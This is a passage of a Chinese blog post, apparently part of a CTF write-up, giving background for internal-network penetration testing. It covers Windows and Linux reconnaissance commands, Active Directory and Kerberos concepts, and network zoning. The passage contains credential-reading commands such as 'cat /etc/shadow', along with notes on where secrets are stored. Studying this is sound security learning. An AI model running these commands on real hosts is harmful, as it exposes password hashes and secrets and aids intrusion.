+<li>端口扫描原理：TCP 三次握手、SYN 扫描、全连接扫描；nmap 参数底层逻辑</li>
+<li>主机存活探测：ARP 扫描（内网最稳，不受 ICMP 拦截）</li>
+</ul>
+<h2 id="Windows-系统基础"><a href="#Windows-系统基础" class="headerlink" title="Windows 系统基础"></a>Windows 系统基础</h2><h3 id="用户与权限体系"><a href="#用户与权限体系" class="headerlink" title="用户与权限体系"></a>用户与权限体系</h3><ul>
+<li>用户分类：本地管理员<code>Administrator</code>、普通本地用户、域用户、域管理员</li>
+<li>用户组：Administrators、Remote Desktop Users、Users、Guests</li>
+<li><strong>权限控制</strong>：UAC 用户账户控制；UAC 绕过前置理解；SAM 数据库（本地账号存储 <code>C:\Windows\System32\config\SAM</code>）</li>
+<li>安全标识符 SID：本地 SID、域 SID；票据漏洞需要 SID</li>
+</ul>
+<h3 id="关键系统文件-路径"><a href="#关键系统文件-路径" class="headerlink" title="关键系统文件 &amp; 路径"></a>关键系统文件 &amp; 路径</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\</span><br><span class="line">C:\Windows\SysWOW64\        <span class="comment"># 32位程序在64位系统存放位置</span></span><br><span class="line">C:\Windows\Tasks\           <span class="comment"># 计划任务</span></span><br><span class="line">C:\ProgramData\             <span class="comment"># 公共程序数据，经常放配置密码</span></span><br><span class="line">C:\Users\用户名\AppData\</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用内置命令（必记）"><a href="#常用内置命令（必记）" class="headerlink" title="常用内置命令（必记）"></a>常用内置命令（必记）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all               <span class="comment"># IP、网卡、DNS、主机名</span></span><br><span class="line"><span class="built_in">whoami</span>                      <span class="comment"># 当前用户</span></span><br><span class="line"><span class="built_in">whoami</span> /priv                <span class="comment"># 当前用户特权（SeDebugPrivilege等提权重点）</span></span><br><span class="line"><span class="built_in">whoami</span> /groups              <span class="comment"># 用户所属组，看是否域管</span></span><br><span class="line">systeminfo                  <span class="comment"># 系统版本、补丁、主机信息</span></span><br><span class="line">net user                    <span class="comment"># 本地用户列表</span></span><br><span class="line">net user 用户名             <span class="comment"># 用户详情</span></span><br><span class="line">net localgroup              <span class="comment"># 本地组</span></span><br><span class="line">net localgroup administrators</span><br><span class="line">net view                    <span class="comment"># 查看内网共享主机（依赖NetBIOS）</span></span><br><span class="line">net share                   <span class="comment"># 本机共享</span></span><br><span class="line">tasklist /v                 <span class="comment"># 进程列表，看进程用户名</span></span><br><span class="line">query user                  <span class="comment"># 查看登录会话（RDP）</span></span><br></pre></td></tr></table></figure>
+
+<p><code>PowerShell</code> 基础：执行策略、<code>Get-Process</code>、<code>Get-NetIPAddress</code>、<code>Get-LocalUser</code></p>
+<h3 id="Windows-认证机制"><a href="#Windows-认证机制" class="headerlink" title="Windows 认证机制"></a>Windows 认证机制</h3><ul>
+<li>本地认证：NTLM Hash（NT Hash），<strong>不存明文密码</strong></li>
+<li>NTLM 认证：挑战应答机制；NTLM 重放攻击基础</li>
+<li>缓存凭据：<code>lsass.exe</code> 进程存放内存凭据；mimikatz 抓取凭据原理前置</li>
+</ul>
+<blockquote>
+<p>lsass 保护、LSA 保护机制，现在新版 Windows 默认防护</p>
+</blockquote>
+<h3 id="服务、计划任务、注册表"><a href="#服务、计划任务、注册表" class="headerlink" title="服务、计划任务、注册表"></a>服务、计划任务、注册表</h3><ul>
+<li>服务：<code>services.msc</code>；自启动服务，服务权限不当是经典提权点</li>
+<li>计划任务：<code>schtasks</code></li>
+<li>注册表：<code>reg query</code>；自动登录密码、存储在注册表的凭据</li>
+</ul>
+<h2 id="Linux-内网基础（服务器内网主机）"><a href="#Linux-内网基础（服务器内网主机）" class="headerlink" title="Linux 内网基础（服务器内网主机）"></a>Linux 内网基础（服务器内网主机）</h2><h3 id="用户-权限"><a href="#用户-权限" class="headerlink" title="用户 &amp; 权限"></a>用户 &amp; 权限</h3><ul>
+<li>root、普通用户、sudo 权限；<code>/etc/passwd</code>、<code>/etc/shadow</code>（哈希存放）</li>
+<li>权限 rwx，SUID、SGID、Sticky 位（Linux 提权高频前置）</li>
+</ul>
+<h3 id="基础命令（内网信息收集）"><a href="#基础命令（内网信息收集）" class="headerlink" title="基础命令（内网信息收集）"></a>基础命令（内网信息收集）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br><span class="line">hostname</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span>                          <span class="comment"># uid/gid/所属组</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line">ps aux</span><br><span class="line">netstat -tulnp / ss -tulnp</span><br><span class="line"><span class="built_in">env</span>                         <span class="comment"># 环境变量，经常泄露密钥密码</span></span><br><span class="line"><span class="built_in">sudo</span> -l                     <span class="comment"># 查看sudo权限</span></span><br><span class="line">crontab -l                  <span class="comment"># 计划任务</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux-内网常见服务"><a href="#Linux-内网常见服务" class="headerlink" title="Linux 内网常见服务"></a>Linux 内网常见服务</h3><p><strong>Samba</strong>（Linux 开 SMB 共享，139&#x2F;445）、NFS 共享、SSH、PostgreSQL、Redis、MongoDB</p>
+<h3 id="关键概念"><a href="#关键概念" class="headerlink" title="关键概念"></a>关键概念</h3><ul>
+<li>PAM 认证、ssh 密钥登录（id_rsa）；内网经常拿到私钥横向</li>
+</ul>
+<h2 id="Active-Directory-域基础（企业内网核心，域渗透前置）"><a href="#Active-Directory-域基础（企业内网核心，域渗透前置）" class="headerlink" title="Active Directory 域基础（企业内网核心，域渗透前置）"></a>Active Directory 域基础（企业内网核心，域渗透前置）</h2><ol>
+<li><strong>域（Domain）</strong>：统一管理一批计算机、用户；域控 DC（Domain Controller）</li>
+<li><strong>域成员</strong>：加入域的 Windows 主机；登录账号是 <code>域名\用户名</code></li>
+<li><strong>AD 数据库</strong>：NTDS.dit，存放全部域账号哈希，DC 上</li>
+<li>域组件<ul>
+<li>域用户、域组：域管理员组 Domain Admins、企业管理员 Enterprise Admins</li>
+<li>计算机对象：每一台加入域的机器在 AD 里是一个机器账号（机器账号也有密码）</li>
+<li>GPO 组策略：统一下发配置、软件、脚本；GPO 漏洞、GPO 密码泄露</li>
+</ul>
+</li>
+<li>两大认证协议<ul>
+<li>NTLM：旧认证，无中心服务器，容易重放</li>
+<li>Kerberos：域默认认证，三个角色：<ul>
+<li>KDC（运行在 DC）：AS + TGS</li>
+<li>AS_REQ&#x2F;AS_REP：获取 TGT 票据（黄金票据伪造 TGT）</li>
+<li>TGS_REQ&#x2F;TGS_REP：获取 ST 服务票据（白银票据伪造 ST）</li>
+<li>AP_REQ：用 ST 访问服务</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>SPN</strong>：服务主体名称，Kerberos 定位服务；SPN 扫描是域内信息收集标志性操作</li>
+</ol>
+<h2 id="内网通用基础概念（攻击链串联）"><a href="#内网通用基础概念（攻击链串联）" class="headerlink" title="内网通用基础概念（攻击链串联）"></a>内网通用基础概念（攻击链串联）</h2><ol>
+<li><strong>凭据 Credential</strong>：明文、NTLM Hash、Kerberos 票据、ssh 私钥、数据库密码、配置文件密码。内网渗透本质大量围绕<strong>凭据流转</strong></li>
+<li>**横向移动 (Lateral Movement)**：拿下一台主机后，用收集到的凭据访问内网其他机器</li>
+<li><strong>权限提升</strong>：从普通用户→管理员；本地提权是内网后渗透第一步</li>
+<li>出网 &amp; 不出网<ul>
+<li>出网：主机可以访问外网，容易回连 <code>CS/msf</code></li>
+<li>不出网：只能内网互通，需要代理（<code>reGeorg</code>、<code>socks</code>、<code>chisel</code>）、正反向端口转发</li>
+</ul>
+</li>
+<li><strong>代理 &#x2F; 隧道基础</strong>：流量转发，多级内网跳板；理解 <code>socks</code> 代理、端口转发区别</li>
+<li><strong>防火墙 &amp; 安全软件</strong>：<code>Windows Defender</code>、EDR；进程拦截、流量审计、<code>lsass</code> 保护，是现在内网最大门槛</li>
+</ol>
+<h2 id="内网安全"><a href="#内网安全" class="headerlink" title="内网安全"></a>内网安全</h2><h3 id="基本概念："><a href="#基本概念：" class="headerlink" title="基本概念："></a>基本概念：</h3><blockquote>
+<ul>
+<li>工作组</li>
+<li>域</li>
+<li>域控制器</li>
+<li>活动目录</li>
+<li>DMZ</li>
+<li>域内权限</li>
+</ul>
+</blockquote>
+<h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组是内网一种简单的设备分组方式，适合小规模网络。</p>
+<ul>
+<li>作用：按部门、用途对计算机做逻辑分组，例如技术部工作组、行政部工作组，方便标识。</li>
+<li>特点：<strong>分散管理</strong>，每台电脑独立管理本地账号、密码、权限；没有统一认证服务器，计算机之间访问独立校验，管理成本会随设备数量上升快速增加。</li>
+<li>对比定位：适合小型办公环境，是轻量化的内网分组方案。</li>
+</ul>
+<h3 id="域的相关概念"><a href="#域的相关概念" class="headerlink" title="域的相关概念"></a>域的相关概念</h3><blockquote>
+<p>域控制器，单域，父域，子域，域树，域森林，域名服务器。</p>
+</blockquote>
+<p>域可以理解为<strong>升级版本的工作组</strong>，拥有一套集中、严格的身份与权限管理体系，适合企业大量终端统一管控。</p>
+<h4 id="域控制器（DC，Domain-Controller）"><a href="#域控制器（DC，Domain-Controller）" class="headerlink" title="域控制器（DC，Domain Controller）"></a>域控制器（DC，Domain Controller）</h4><p>域控制器是域环境的核心服务器：</p>
+<ul>
+<li>承载域内全部用户、计算机账号信息，负责域内所有身份认证、权限审核；</li>
+<li>域内主机互相访问、用户登录域主机时，身份核验都由 DC 处理；</li>
+<li>域内账号密码、对象信息统一存储在 DC 中。</li>
+</ul>
+<h4 id="活动目录（AD，Active-Directory）"><a href="#活动目录（AD，Active-Directory）" class="headerlink" title="活动目录（AD，Active Directory）"></a>活动目录（AD，Active Directory）</h4><p>AD 是域环境里提供<strong>目录服务</strong>的核心组件，本质是一个对象数据库：</p>
+<ul>
+<li>存储对象：域用户、用户组、计算机、共享文件夹、打印机等资源；</li>
+<li>核心能力：<ol>
+<li>账号集中管理：账号只需要在 AD 创建一次，域内任意主机都可以使用该账号登录，密码修改全局生效；</li>
+<li>资源与软件集中管理：统一推送软件、配置网络打印机；</li>
+<li>安全策略集中下发：统一密码策略、权限规则、杀毒与扫描任务。</li>
+</ol>
+</li>
+<li>DC 和 AD 的区别：AD 是目录数据库 &#x2F; 服务；<strong>安装了 AD 服务的服务器，就是域控制器 DC</strong>。</li>
+</ul>
+<h4 id="DNS（域名服务器）"><a href="#DNS（域名服务器）" class="headerlink" title="DNS（域名服务器）"></a>DNS（域名服务器）</h4><p>在域环境中承担域名与 IP 地址解析，域主机依靠 DNS 找到域控制器，是域正常工作的基础服务。</p>
+<h4 id="域体系扩展名词"><a href="#域体系扩展名词" class="headerlink" title="域体系扩展名词"></a>域体系扩展名词</h4><ul>
+<li>单域：独立的一个域，小型企业最常用；</li>
+<li>父域 &#x2F; 子域：层级关系，子域隶属于父域；</li>
+<li>域树：由多个有连续命名空间的父子域组成；</li>
+<li>域森林：多棵域树的集合，共享一套架构与信任机制。</li>
+</ul>
+<h3 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h3><h4 id="划分目的"><a href="#划分目的" class="headerlink" title="划分目的"></a>划分目的</h4><p>把安全等级一致的设备划入同一个网段，利用防火墙在域边界配置访问控制策略，限制跨域访问，收缩攻击面，降低风险。</p>
+<h4 id="经典三区划分（防火墙隔离）"><a href="#经典三区划分（防火墙隔离）" class="headerlink" title="经典三区划分（防火墙隔离）"></a>经典三区划分（防火墙隔离）</h4><ol>
+<li><p><strong>外网（互联网）</strong>：安全等级最低，不可信；</p>
+</li>
+<li><p>DMZ（隔离区 &#x2F; 非军事区）</p>
+<p>：缓冲区，安全等级中等；</p>
+<ul>
+<li>部署对外提供服务的设备（官网、业务网关等）；</li>
+<li>外网用户可以访问 DMZ 区域；DMZ 默认不允许主动访问核心内网；</li>
+</ul>
+</li>
+<li><p><strong>内网（信任区）</strong>：安全等级最高，存放办公、业务核心服务器与终端，严格限制外网直接访问。</p>
+</li>
+</ol>
+<blockquote>
+<p>DMZ 的价值：在保护内网核心资产的前提下，对外提供业务服务，避免外网流量直接进入可信内网。</p>
+</blockquote>
+<h3 id="工作组-vs-域"><a href="#工作组-vs-域" class="headerlink" title="工作组 vs 域"></a>工作组 vs 域</h3><ul>
+<li>工作组：分布式管理，每台机器管自己账号；配置简单，适合少量电脑；无统一认证中心。</li>
+<li>域 + AD：集中式管理，账号、权限、策略全部由 DC&#x2F;AD 统一管控；安全性更强，适合中大型企业。</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="http://www.baidu.com">Teaaa</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/web859/">http://example.com/web859/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">choco</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a><a class="post-meta__tags" href="/tags/linux/">linux</a></div><div class="post-share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/sqlmap/" title="SQLMap使用总结及CTFshow靶场所有题目详细分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">SQLMap使用总结及CTFshow靶场所有题目详细分析</div></div><div class="info-2"><div class="info-item-1"> 成为 AI 小子第二步！  来自学长原话：sqlmap使用 - baozongwi’s blog 我感觉这个比nmap难一些，使用nmap时，学的是怎么用工具；而这个学的是目标。 这个工具CTF里基本用不了，不过实际渗透中相当实用，特别是 UDF 提权，都要使用到其中的 so 文件 工具简介基础信息sqlmap 是 Python 编写、开源 GPLv2 协议 的 SQL 注入自动化检测 + 利用工具，作者：Bernardo Damele、Miroslav Stampar，2006 年发布，官网：sqlmap.org，GitHub也有。 Kali、Parrot 等渗透系统预装；Windows &#x2F; MacOS 只要有 Python3 都可以手动部署。 核心定位：把手工 SQL 注入的整套流程自动化，是网安行业 SQL 注入测试的标准工具。 核心能力总览 自动检测：识别注入点、自动判断注入类型、指纹识别后端数据库 信息枚举：库、表、字段、数据、账号密码哈希、权限、版本、操作系统 高级利用（依赖 DBA 权限 + 数据库配置）：读取文件、写入文件、执行系统命令、获取交互式 O...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Teaaa</div><div class="author-info-description">一万年太久只争朝夕</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/chocoteaaa/chocoteaaa.github.io.git"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">扎根ing 😲</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web859"><span class="toc-number">1.</span> <span class="toc-text">Web859</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA"><span class="toc-number">1.1.</span> <span class="toc-text">提示</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text">基础探测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%88%A4%E6%96%AD%EF%BC%88%E5%86%B3%E5%AE%9A%E5%B7%A5%E5%85%B7%E8%83%BD%E4%B8%8D%E8%83%BD%E7%94%A8%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">环境判断（决定工具能不能用）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%9D%83%E9%99%90%E7%9B%B8%E5%85%B3"><span class="toc-number">3.1.</span> <span class="toc-text">基础权限相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E"><span class="toc-number">3.1.1.</span> <span class="toc-text">参数说明</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%8A%B6%E5%86%B5"><span class="toc-number">3.2.</span> <span class="toc-text">系统状况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E7%8A%B6%E5%86%B5"><span class="toc-number">3.3.</span> <span class="toc-text">容器状况</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.</span> <span class="toc-text">网络拓扑探测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A7%A3%E8%AF%BB%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">命令解读：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%B2%E8%81%94"><span class="toc-number">4.2.</span> <span class="toc-text">串联</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%AF%E7%94%A8%E5%B7%A5%E5%85%B7%E6%9E%9A%E4%B8%BE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">5.</span> <span class="toc-text">可用工具枚举与文件夹</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%B7%B2%E7%BB%8F%E5%AE%89%E8%A3%85%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%8C%85"><span class="toc-number">5.1.</span> <span class="toc-text">查看已经安装的软件包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%AD%98%E6%94%BE%E4%BD%8D%E7%BD%AE"><span class="toc-number">5.2.</span> <span class="toc-text">查看常见文件存放位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E5%AE%9E%E6%B5%8B%E7%BB%93%E6%9E%9C%EF%BC%9A"><span class="toc-number">5.3.</span> <span class="toc-text">本机实测结果：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%B5%8B%E5%AF%B9%E5%BA%94%E5%86%B3%E7%AD%96%EF%BC%9A"><span class="toc-number">5.4.</span> <span class="toc-text">实测对应决策：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E7%9B%B8%E5%85%B3"><span class="toc-number">6.</span> <span class="toc-text">提权相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E4%B8%AA%E4%B8%8D%E5%90%8C%E7%9A%84%E2%80%9D%E6%8F%90%E6%9D%83%E2%80%9D%E5%9C%BA%E6%99%AF"><span class="toc-number">6.1.</span> <span class="toc-text">三个不同的”提权”场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E6%83%85%E5%86%B5"><span class="toc-number">6.2.</span> <span class="toc-text">本机情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%B0%E7%8A%B6%E6%80%BB%E7%BB%93"><span class="toc-number">6.3.</span> <span class="toc-text">现状总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E7%9A%84%E6%AD%A5%E9%AA%A4"><span class="toc-number">6.4.</span> <span class="toc-text">接下来的步骤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7"><span class="toc-number">7.</span> <span class="toc-text">内网扫描工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fscan%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D"><span class="toc-number">8.</span> <span class="toc-text">Fscan工具介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E8%83%BD%E5%8A%9B%EF%BC%88%E5%AF%B9%E6%AF%94-Nmap%EF%BC%89"><span class="toc-number">8.1.</span> <span class="toc-text">核心能力（对比 Nmap）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">8.2.</span> <span class="toc-text">常用基础命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fscan-vs-Nmap%EF%BC%88%E9%87%8D%E7%82%B9%EF%BC%89"><span class="toc-number">8.3.</span> <span class="toc-text">fscan vs Nmap（重点）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7"><span class="toc-number">8.4.</span> <span class="toc-text">上传工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8F%E4%B8%8A%E4%BC%A0"><span class="toc-number">8.4.1.</span> <span class="toc-text">交互式上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E4%BA%A4%E4%BA%92%E5%BC%8F%E4%B8%8A%E4%BC%A0"><span class="toc-number">8.4.2.</span> <span class="toc-text">非交互式上传</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%AB%E5%86%85%E7%BD%91"><span class="toc-number">9.</span> <span class="toc-text">扫内网</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C%E6%95%B4%E7%90%86%E4%B8%8E%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-number">9.1.</span> <span class="toc-text">结果整理与问题：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E5%88%A9%E7%94%A8Samba%E6%9C%8D%E5%8A%A1%E7%9A%84CVE"><span class="toc-number">10.</span> <span class="toc-text">MSF利用Samba服务的CVE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%B7-msfconsole%EF%BC%88%E8%A6%81-root%EF%BC%89"><span class="toc-number">10.1.</span> <span class="toc-text">起 msfconsole（要 root）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%89%88%E6%9C%AC"><span class="toc-number">10.2.</span> <span class="toc-text">探测版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8F%AA%E6%8E%A2%E6%B5%8B%EF%BC%8C%E4%B8%8D%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-number">10.3.</span> <span class="toc-text">确认漏洞（只探测，不执行）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.4.</span> <span class="toc-text">利用漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%86%85%E5%AE%B9"><span class="toc-number">10.5.</span> <span class="toc-text">读取内容</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E5%85%B6%E5%AE%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">11.</span> <span class="toc-text">MSF其它命令执行方式：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1%E6%80%A7%E6%89%A7%E8%A1%8C%EF%BC%88%E4%B8%8D%E7%A6%BB%E5%BC%80-msf-%E6%8E%A7%E5%88%B6%E5%8F%B0%EF%BC%89"><span class="toc-number">11.1.</span> <span class="toc-text">一次性执行（不离开 msf 控制台）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8F%E6%89%A7%E8%A1%8C"><span class="toc-number">11.2.</span> <span class="toc-text">交互式执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Meterpreter-%E5%86%85%E9%83%A8%E7%9A%84%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F%EF%BC%88%E8%BF%99%E4%B8%AA%E4%B8%8D%E9%94%99%EF%BC%89"><span class="toc-number">11.2.1.</span> <span class="toc-text">Meterpreter 内部的执行方式（这个不错）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E9%87%8F-%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="toc-number">11.3.</span> <span class="toc-text">批量 &#x2F; 自动化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E6%AC%A1-Samba-%E4%BC%9A%E8%AF%9D%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">11.4.</span> <span class="toc-text">本次 Samba 会话的注意事项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">12.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">13.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PS%EF%BC%9A%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">14.</span> <span class="toc-text">PS：前置基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80"><span class="toc-number">14.1.</span> <span class="toc-text">内网网络基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="toc-number">14.1.1.</span> <span class="toc-text">内网核心概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AB%AF%E5%8F%A3-%E4%BD%9C%E7%94%A8%EF%BC%89"><span class="toc-number">14.1.2.</span> <span class="toc-text">内网常用协议（端口 + 作用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%89%8D%E7%BD%AE"><span class="toc-number">14.1.3.</span> <span class="toc-text">内网信息收集前置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80"><span class="toc-number">14.2.</span> <span class="toc-text">Windows 系统基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%B8%8E%E6%9D%83%E9%99%90%E4%BD%93%E7%B3%BB"><span class="toc-number">14.2.1.</span> <span 